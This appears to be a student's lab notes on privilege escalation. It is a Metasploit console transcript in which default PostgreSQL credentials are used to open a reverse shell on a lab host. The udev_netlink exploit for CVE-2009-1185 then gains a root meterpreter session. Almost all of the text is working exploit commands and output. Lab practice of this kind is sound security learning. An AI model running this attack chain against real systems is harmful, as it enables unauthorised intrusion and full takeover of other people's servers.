# Privilege escalation

https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9

PostgreSQL versin 8.3.1

From week 5, we saw how we can gain shell access using a vulnerability with the PostgreSQL

## Phase1: initiate a session 

```bash
msf5 exploit(linux/postgres/postgres_payload) > set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp
msf5 exploit(linux/postgres/postgres_payload) > show options

Module options (exploit/linux/postgres/postgres_payload):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS    10.2.2.100       yes       The target address range or CIDR identifier
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output


Payload options (linux/x86/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.2.2.50        yes       The listen address (an interface may be specified)
   LPORT  5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86

msf5 exploit(linux/postgres/postgres_payload) > exploit -j -z
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.2.2.50:5555 
msf5 exploit(linux/postgres/postgres_payload) > [*] 10.2.2.100:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
[*] Uploaded as /tmp/PgGCcjnb.so, should be cleaned up automatically
[*] Sending stage (36 bytes) to 10.2.2.100
[*] Command shell session 3 opened (10.2.2.50:5555 -> 10.2.2.100:53273) at 2023-09-28 00:25:02 -0400
msf5 exploit(linux/postgres/postgres_payload) > 
```

## Phase2: use udev_netlink

CVE  
https://cvedetails.com/cve/CVE-2009-1185/

Exploit Source Code:  
https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/linux/local/udev_netlink.rb

```bash
msf5 exploit(linux/postgres/postgres_payload) > sessions

Active sessions
===============

  Id  Name  Type             Information  Connection
  --  ----  ----             -----------  ----------
  1         shell x86/linux               10.2.2.50:4444 -> 10.2.2.100:54004 (10.2.2.100)

msf5 exploit(linux/postgres/postgres_payload) > search udev_netlink

Matching Modules
================

   #  Name                              Disclosure Date  Rank   Check  Description
   -  ----                              ---------------  ----   -----  -----------
   0  exploit/linux/local/udev_netlink  2009-04-16       great  No     Linux udev Netlink Local Privilege Escalation


msf5 exploit(linux/postgres/postgres_payload) > use 0
msf5 exploit(linux/local/udev_netlink) > show options

Module options (exploit/linux/local/udev_netlink):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   NetlinkPID                   no        Usually udevd pid-1.  Meterpreter sessions will autodetect
   SESSION                      yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Linux x86


msf5 exploit(linux/local/udev_netlink) > set session 1
session => 1
msf5 exploit(linux/local/udev_netlink) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Attempting to autodetect netlink pid...
[*] Shell session, trying sh script to find netlink pid
[+] Found netlink pid: 2710
[*] Writing payload executable (207 bytes) to /tmp/YvBLGEdBFd
[*] Writing exploit executable (1879 bytes) to /tmp/FAHHirQFfI
[*] chmod'ing and running it...
[*] Exploit completed, but no session was created.
msf5 exploit(linux/local/udev_netlink) > run

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Attempting to autodetect netlink pid...
[*] Shell session, trying sh script to find netlink pid
[+] Found netlink pid: 2710
[*] Writing payload executable (207 bytes) to /tmp/fYjoyYsdku
[*] Writing exploit executable (1879 bytes) to /tmp/RRusLCWZqG
[*] chmod'ing and running it...
[*] Exploit completed, but no session was created.

msf5 exploit(linux/local/udev_netlink) > show options

Module options (exploit/linux/local/udev_netlink):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   NetlinkPID                   no        Usually udevd pid-1.  Meterpreter sessions will autodetect
   SESSION     2                yes       The session to run this module on.


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86


msf5 exploit(linux/local/udev_netlink) > set LHOST 10.2.2.50
LHOST => 10.2.2.50
msf5 exploit(linux/local/udev_netlink) > run

[*] Started reverse TCP handler on 10.2.2.50:4444 
[*] Attempting to autodetect netlink pid...
[*] Meterpreter session, using get_processes to find netlink pid
[*] udev pid: 2711
[+] Found netlink pid: 2710
[*] Writing payload executable (207 bytes) to /tmp/evHNzTJxec
[*] Writing exploit executable (1879 bytes) to /tmp/qmiWRLasTC
[*] chmod'ing and running it...
[*] Sending stage (985320 bytes) to 10.2.2.100
[*] Meterpreter session 3 opened (10.2.2.50:4444 -> 10.2.2.100:58285) at 2023-09-28 01:00:08 -0400

meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > shell
Process 24216 created.
Channel 1 created.
id
uid=0(root) gid=0(root)

```

